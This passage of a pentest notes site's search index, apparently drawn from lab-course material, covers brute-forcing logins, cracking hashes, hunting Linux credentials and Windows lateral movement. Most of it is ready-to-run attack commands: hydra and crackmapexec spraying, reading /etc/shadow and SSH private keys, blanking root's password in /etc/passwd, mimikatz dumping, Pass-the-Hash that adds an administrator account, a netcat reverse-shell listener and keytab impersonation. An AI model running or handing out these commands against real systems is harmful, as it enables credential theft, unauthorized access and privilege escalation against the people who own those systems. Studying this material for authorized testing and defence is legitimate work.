Password","text":""},{"location":"zNew/BruteForce/BruteForce/#john-the-ripper","title":"John The Ripper","text":"<pre><code>$ john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt`\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#hashcat","title":"Hashcat","text":"<pre><code>$ hashcat -m 3200 -a 0 -o found.txt passwd.txt /usr/share/wordlists/rockyou.txt\n\n# 1000 NTLM hashes\n# 5600 NTLMv2 hashes\n# 13100 Kerberos TGS\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#password-mutations","title":"Password Mutations","text":"<p><code>/usr/share/hashcat/rules/</code></p> <pre><code>$ hashcat --force password.list -r custom.rule --stdout | sort -u &gt; mut_password.list\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#custom-wordlists","title":"Custom Wordlists","text":""},{"location":"zNew/BruteForce/BruteForce/#cewl","title":"CeWL","text":"<p>We can now use another tool called CeWL to scan potential words from the company's website and save them in a separate list. We can then combine this list with the desired rules and create a customized password list that has a higher probability of guessing a correct password. We specify some parameters, like the depth to spider (-d), the minimum length of the word (-m), the storage of the found words in lowercase (--lowercase), as well as the file where we want to store the results (-w).</p> <pre><code>$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist\n</code></pre> <ul> <li><code>-d minimum word length</code></li> <li><code>-m maximum word length</code></li> <li><code>--lowercase all words are lowercase</code></li> <li><code>-w output file</code></li> </ul>"},{"location":"zNew/BruteForce/BruteForce/#cupp","title":"CUPP","text":"<pre><code>$ cupp -i\n\nsed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8\nsed -ri '/[!-/:-@\\[-`\\{-~]+/!d' william.txt # remove no special chars\nsed -ri '/[0-9]+/!d' william.txt            # remove no numbers\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#custom-list-of-usernames","title":"Custom list of Usernames","text":"<pre><code>$ ./username-anarchy -i /home/ltnbob/names.txt \n$ ./username-anarchy Bill Gates &gt; bill.txt\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#default-passwords","title":"Default Passwords","text":"<p>Credential Stuffing - Hydra There are various databases that keep a running list of known default credentials. One of them is the (DefaultCreds-Cheat-Sheet)[https://github.com/ihebski/DefaultCreds-cheat-sheet]. Here is a small excerpt from the entire table of this cheat sheet:</p> <p>This is a simplified variant of brute-forcing because only composite usernames and the associated passwords are used.</p> <pre><code>$ hydra -C &lt;user_pass.list&gt; &lt;protocol&gt;://&lt;IP&gt;\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#services","title":"Services","text":"<p><code>Note: Although we may find services vulnerable to brute force, most applications today prevent these types of attacks. A more effective method is Password Spraying.</code></p>"},{"location":"zNew/BruteForce/BruteForce/#hydra","title":"Hydra","text":"<pre><code>$ hydra -L user.list -P password.list &lt;protocol&gt;://&lt;IP&gt; -t 48 -p &lt;port&gt;\n\n- L user list \n- l single username \n- P pass list\n- p single password\n- t &lt;num&gt; threads\n- p &lt;port&gt;\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#ftp","title":"FTP","text":"<pre><code>$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp \n\n$ hydra -L user.list -P password.list ftp://&lt;IP&gt; -s 21\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#ssh","title":"SSH","text":"<pre><code>$ hydra -L user.list -P password.list ssh://&lt;IP&gt;\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#smb","title":"SMB","text":"<pre><code>$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth\n\n$ hydra -L user.list -P password.list smb://10.129.42.197\n\n$ msf6 &gt; use auxiliary/scanner/smb/smb_login\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#winrm","title":"WinRM","text":"<pre><code>$ crackmapexec winrm &lt;IP&gt; -u user.list -p password.list\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#rdp","title":"RDP","text":"<pre><code>$ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'\n$ hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp\n$ hydra -L user.list -P password.list rdp://10.129.42.197`\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#login-attacks","title":"Login Attacks","text":""},{"location":"zNew/BruteForce/BruteForce/#default-passwords_1","title":"Default Passwords","text":"<p><code>/usr/share/wordlists/seclists/Passwords/Default-Credentials</code></p> <pre><code>$ hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt &lt;IP&gt; -s &lt;PORT&gt; http-get /\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#usernamepassword-attack","title":"Username/Password Attack","text":"<pre><code>$ hydra -L /usr/share/wordlists/secLists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt -u -f &lt;IP&gt; -s &lt;PORT&gt; http-get /\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#username-brute-force","title":"Username Brute Force","text":"<pre><code>$ hydra -L /usr/share/wordlists/secLists/Usernames/Names/names.txt -p &lt;PASSWORD&gt; -u -f &lt;IP&gt; -s &lt;PORT&gt; http-get /\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#brute-forcing-forms","title":"Brute Forcing Forms","text":"<p>two types of http modules interesting for us:</p> <ul> <li>http[s]-{head|get|post}</li> <li>http[s]-post-form The 1st module serves for basic HTTP authentication, while the 2nd module is used for login forms, like .php or .aspx and others.</li> </ul> <p>To decide which module we need, we have to determine whether the web application uses GET or a POST form. We can test it by trying to log in and pay attention to the URL. If we recognize that any of our input was pasted into the URL, the web application uses a GET form. Otherwise, it uses a POST form.</p> <pre><code>$ hydra -l &lt;admin&gt; -P /usr/share/wordlists/rockyou.txt -f &lt;IP&gt; -s &lt;PORT&gt; http-post-form \"/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name='login'\"\n</code></pre> <ul> <li>login.php: url</li> <li>username=^USER^&amp;password=^PASS^: parameters to POST (Capture on Burp Suite)</li> <li>Third: form name (Check source code)</li> </ul>"},{"location":"zNew/BruteForce/BruteForce/#protected-files","title":"Protected Files","text":""},{"location":"zNew/BruteForce/BruteForce/#cracking-with-john","title":"Cracking with John","text":"<pre><code>$ locate *2john*\n</code></pre> <pre><code>$ ssh2john.py SSH.private &gt; ssh.hash\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#cracking-openssl-encrypted-archives","title":"Cracking OpenSSL Encrypted Archives","text":"<pre><code>$ file GZIP.gzip \n\nGZIP.gzip: openssl enc'd data with salted password\n</code></pre>"},{"location":"zNew/BruteForce/BruteForce/#using-a-for-loop-to-display-extracted-contents","title":"Using a for-loop to Display Extracted Contents","text":"<pre><code>$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null| tar xz;done\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/","title":"Credential Hunting in Linux","text":"<p>Files   History     Memory  Key-Rings Configs     Logs    Cache   Browser stored credentials Databases   Command-line History    In-memory Processing   Notes          Scripts            Source codes           Cronjobs           SSH Keys    </p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#files","title":"Files","text":"<p>Configuration files     Databases   Notes Scripts     Cronjobs    SSH keys</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#configuration-files","title":"Configuration Files","text":"<pre><code>$ for l in $(echo \".conf .config .cfg .cnf\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"lib\\|fonts\\|share\\|core\" ;done\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#credentials-in-configuration-files","title":"Credentials in Configuration Files","text":"<pre><code>$ for i in $(find / -name *.cnf 2&gt;/dev/null | grep -v \"doc\\|lib\");do echo -e \"\\nFile: \" $i; grep \"user\\|password\\|pass\" $i 2&gt;/dev/null | grep -v \"\\#\";done\n</code></pre> <p>We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#databases","title":"Databases","text":"<pre><code>$ for l in $(echo \".sql .db .*db .db*\");do echo -e \"\\nDB File extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\\|man\";done\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#notes","title":"Notes","text":"<pre><code>$ find /home/* -type f -name \"*.txt\" -o ! -name \"*.*\"\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#scripts","title":"Scripts","text":"<pre><code>$ for l in $(echo \".py .pyc .pl .go .jar .c .sh\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\";done\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#cronjobs","title":"Cronjobs","text":"<pre><code>$ cat /etc/crontab\n$ ls -la /etc/cron.*/\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#ssh-keys","title":"SSH Keys","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#ssh-private-keys","title":"SSH Private Keys","text":"<pre><code>$ grep -rnw \"PRIVATE KEY\" /home/* 2&gt;/dev/null | grep \":1\"\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#ssh-public-keys","title":"SSH Public Keys","text":"<pre><code>$ grep -rnw \"ssh-rsa\" /home/* 2&gt;/dev/null | grep \":1\"`\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#history","title":"History","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#bash-history","title":"Bash History","text":"<p><code>tail -n5 /home/*/.bash*</code></p> <p>Application Logs    Event Logs  Service Logs    System Logs</p> Log File Description /var/log/messages Generic system activity logs. /var/log/syslog Generic system activity logs. /var/log/auth.log (Debian) All authentication related logs. /var/log/secure (RedHat/CentOS) All authentication related logs. /var/log/boot.log Booting information. /var/log/dmesg Hardware and drivers related information and logs. /var/log/kern.log Kernel related warnings, errors and logs. /var/log/faillog Failed login attempts. /var/log/cron Information related to cron jobs. /var/log/mail.log All mail server related logs. /var/log/httpd All Apache related logs. /var/log/mysqld.log All MySQL server related logs. <pre><code>$ for i in $(ls /var/log/* 2&gt;/dev/null);do GREP=$(grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null); if [[ $GREP ]];then echo -e \"\\n#### Log file: \" $i; grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null;fi;done\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#memory-and-cache","title":"Memory and Cache","text":"<p>Memory - Mimipenguin this tool requires administrator/root permissions.</p> <pre><code>$ sudo python3 mimipenguin.py`\n$ sudo bash mimipenguin.sh`\n</code></pre> <p>Memory - LaZagne</p> <pre><code>$ sudo python2.7 laZagne.py all`\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#browsers","title":"Browsers","text":"<p>Firefox Stored Credentials</p> <pre><code>$ ls -l .mozilla/firefox/ | grep default\n$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .\n</code></pre> <p>Decrypting Firefox Credentials</p> <pre><code>$ python3.9 firefox_decrypt.py`\n</code></pre> <p>Browsers - LaZagne</p> <pre><code>$ python3 laZagne.py browsers`\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#passwd-shadow-opasswd","title":"Passwd, Shadow &amp; Opasswd","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#passwd-file","title":"Passwd File","text":"<p>Usually, we find the value x in this field, which means that the passwords are stored in an encrypted form in the /etc/shadow file. However, it can also be that the /etc/passwd file is writeable by mistake. This would allow us to clear this field for the user root so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as root.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#editing-etcpasswd-before","title":"Editing /etc/passwd - Before","text":"<p>root:x:0:0:root:/root:/bin/bash</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#editing-etcpasswd-after","title":"Editing /etc/passwd - After","text":"<p>root::0:0:root:/root:/bin/bash</p> <p>Even though the cases shown will rarely occur, we should still pay attention and watch for security gaps because there are applications that require us to set specific permissions for entire folders. If the administrator has little experience with Linux or the applications and their dependencies, the administrator may give write permissions to the /etc directory and forget to correct them.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#opasswd","title":"Opasswd","text":"<p>The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.</p> <pre><code>$ sudo cat /etc/security/opasswd\n</code></pre> <p>Looking at the contents of this file, we can see that it contains several entries for the user cry0l1t3, separated by a comma (,). Another critical point to pay attention to is the hashing type that has been used. This is because the MD5 ($1$) algorithm is much easier to crack than SHA-512. This is especially important for identifying old passwords and maybe even their pattern because they are often used across several services or applications. We increase the probability of guessing the correct password many times over based on its pattern.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#cracking-linux-credentials","title":"Cracking Linux Credentials","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#unshadow","title":"Unshadow","text":"<pre><code>$ sudo cp /etc/passwd /tmp/passwd.bak \n$ sudo cp /etc/shadow /tmp/shadow.bak \n$ unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#hashcat-cracking-unshadowed-hashes","title":"Hashcat - Cracking Unshadowed Hashes","text":"<pre><code>$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/#hashcat-cracking-md5-hashes","title":"Hashcat - Cracking MD5 Hashes","text":"<pre><code>$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/","title":"Pass the Hash (PtH)","text":"<p>A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.</p> <pre><code>Dumping the local SAM database from a compromised host.\nExtracting hashes from the NTDS database (ntds.dit) on a Domain Controller.\nPulling the hashes from memory (lsass.exe).\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/#pass-the-hash-from-windows-using-mimikatz","title":"Pass the Hash from Windows Using Mimikatz:","text":"<pre><code>&gt; .\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" &gt;&gt; c:\\tmp\\mimikatz_output.txt` \n\n&gt; mimikatz.exe privilege::debug \"sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe\" exit\n</code></pre> <p>Now we can use cmd.exe to execute commands in the user's context. For this example, julio can connect to a shared folder named julio on the DC.</p> <pre><code>&gt; dir \\\\dc01\\julio\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-powershell-invoke-thehash-windows-httpsgithubcomkevin-robertsoninvoke-thehash","title":"Pass the Hash with PowerShell Invoke-TheHash (Windows) [https://github.com/Kevin-Robertson/Invoke-TheHash]","text":"<ul> <li>Target - Hostname or IP address of the target.</li> <li>Username - Username to use for authentication.</li> <li>Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.</li> <li>Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.</li> <li>Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash- have access to WMI on the target.</li> </ul> <p>The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/#invoke-thehash-with-smb","title":"Invoke-TheHash with SMB","text":"<pre><code>PS &gt; Import-Module .\\Invoke-TheHash.psd1\nPS &gt; Invoke-SMBExec -Target 10.129.186.240 -Domain inlanefreight.htb -Username david -Hash c39f2beb3d2ec06a62cb887fb391dee0 -Command \"net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add\" -Verbose\n</code></pre> <p>To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address 172.16.1.5. We will use port 8001 to wait for the connection.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/#netcat-listener","title":"Netcat Listener","text":"<pre><code>c:\\htb&gt; .\\nc.exe -lvnp 8001\n</code></pre> <p>Now we can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is 172.16.1.10, we will use the machine name DC01 (either would work).</p> <pre><code>Import-Module .\\Invoke-TheHash.psd1\nInvoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command \"powershell -e \"\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-impacket-linux","title":"Pass the Hash with Impacket (Linux)","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-impacket-psexec","title":"Pass the Hash with Impacket PsExec","text":"<pre><code>$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453\n</code></pre> <p>There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as: - impacket-wmiexec [https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py] - impacket-atexec [https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py] - impacket-smbexec [https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py]</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-crackmapexec-linux","title":"Pass the Hash with CrackMapExec (Linux)","text":"<pre><code># crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453\n</code></pre> <p>If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add --local-auth to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see Pwn3d!, it means that the user is a local administrator on the target computer. We can use the option -x to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the Local Administrator Password Solution (LAPS), which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/#crackmapexec-command-execution","title":"CrackMapExec - Command Execution","text":"<pre><code># crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-evil-winrm-linux","title":"Pass the Hash with evil-winrm (Linux)","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-evil-winrm","title":"Pass the Hash with evil-winrm","text":"<pre><code># evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/#pass-the-hash-with-rdp-linux","title":"Pass the Hash with RDP (Linux)","text":"<p>There are a few caveats to this attack:</p> <pre><code>Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:\n</code></pre> <p>This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa with the value of 0. It can be done using the following command:</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/#enable-restricted-admin-mode-to-allow-pth","title":"Enable Restricted Admin Mode to Allow PtH","text":"<pre><code>c:\\tools&gt; reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n</code></pre> <p>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/#pass-the-hash-using-rdp","title":"Pass the Hash Using RDP","text":"<pre><code>xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/#uac-limits-pass-the-hash-for-local-accounts","title":"UAC Limits Pass the Hash for Local Accounts","text":"<p>UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, \"Administrator\") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.</p> <p>Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.</p> <p>These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/","title":"Pass the Ticket (PtT) from Linux","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#kerberos-on-linux","title":"Kerberos on Linux","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#identifying-linux-and-active-directory-integration","title":"Identifying Linux and Active Directory Integration","text":""},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#realm-check-if-linux-machine-is-domain-joined","title":"realm - Check If Linux Machine is Domain Joined","text":"<pre><code>$ realm list\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#ps-check-if-linux-machine-is-domain-joined","title":"PS - Check if Linux Machine is Domain Joined","text":"<pre><code>$ ps -ef | grep -i \"winbind\\|sssd\"`\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#finding-kerberos-tickets-in-linux","title":"Finding Kerberos Tickets in Linux","text":"<p>As an attacker, we are always looking for credentials. On Linux domain joined machines, we want to find Kerberos tickets to gain more access. Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings. Let's explore some common ways to find Kerberos tickets.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#finding-keytab-files","title":"Finding Keytab Files","text":"<p>A straightforward approach is to use find to search for files whose name contains the word keytab. When an administrator commonly creates a Kerberos ticket to be used with a script, it sets the extension to .keytab. Although not mandatory, it is a way in which administrators commonly refer to a keytab file.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#using-find-to-search-for-files-with-keytab-in-the-name","title":"Using Find to Search for Files with Keytab in the Name","text":"<pre><code>$ find / -name *keytab* -ls 2&gt;/dev/null\n</code></pre> <p><code>Note: To use a keytab file, we must have read and write (rw) privileges on the file.</code></p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#identifying-keytab-files-in-cronjobs","title":"Identifying Keytab Files in Cronjobs","text":"<pre><code>$ crontab -l\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#finding-ccache-files","title":"Finding ccache Files","text":"<p>A credential cache or ccache file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the KRB5CCNAME environment variable. This variable is used by tools that support Kerberos authentication to find the Kerberos data. Let's look for the environment variables and identify the location of our Kerberos credentials cache:</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#reviewing-environment-variables-for-ccache-files","title":"Reviewing Environment Variables for ccache Files.","text":"<pre><code>$ env | grep -i krb5\n</code></pre> <p>As mentioned previously, ccache files are located, by default, at /tmp. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their ccache file while it is still valid.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#searching-for-ccache-files-in-tmp","title":"Searching for ccache Files in /tmp","text":"<pre><code>$ ls -la /tmp\n</code></pre>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#abusing-keytab-files","title":"Abusing KeyTab Files","text":"<p>As attackers, we may have several uses for a keytab file. The first thing we can do is impersonate a user using kinit. To use a keytab file, we need to know which user it was created for. klist is another application used to interact with Kerberos on Linux. This application reads information from a keytab file. Let's see that with the following command:</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#listing-keytab-file-information","title":"Listing keytab File Information","text":"<pre><code>$ klist -k -t \n</code></pre> <p>The ticket corresponds to the user Carlos. We can now impersonate the user with kinit. Let's confirm which ticket we are using with klist and then import Carlos's ticket into our session with kinit.</p> <p><code>Note: kinit is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.</code></p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#impersonating-a-user-with-a-keytab","title":"Impersonating a User with a keytab","text":"<pre><code>$ klist\n$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab\n$ klist\n</code></pre> <p>We can attempt to access the shared folder \\dc01\\carlos to confirm our access.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/#connecting-to-smb-share-as-carlos","title":"Connecting to SMB Share as Carlos","text":"<pre><code>$ smbclient //dc01/carlos -k -c ls\n</code></pre> <p><code>Note: To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the enviroment variable KRB5CCNAME.</code></p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/","title":"Pass the Ticket (PtT) from Windows","text":"<p>Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. We'll cover several ways to perform a PtT attack from Windows and Linux. In this section, we'll focus on Windows attacks, and in the following section, we'll cover attacks from Linux.</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#pass-the-ticket-ptt-attack","title":"Pass the Ticket (PtT) Attack","text":"<p>We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:</p> <pre><code>- `Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.`\n- `Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.`\n</code></pre> <p>Before we perform a Pass the Ticket (PtT) attack, let's see some methods to get a ticket using Mimikatz [https://github.com/ParrotSec/mimikatz] and Rubeus [https://github.com/GhostPack/Rubeus].</p>"},{"location":"zNew/BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/#harvesting-kerberos-tickets-from-windows","title":"Harvesting Kerberos Tickets from 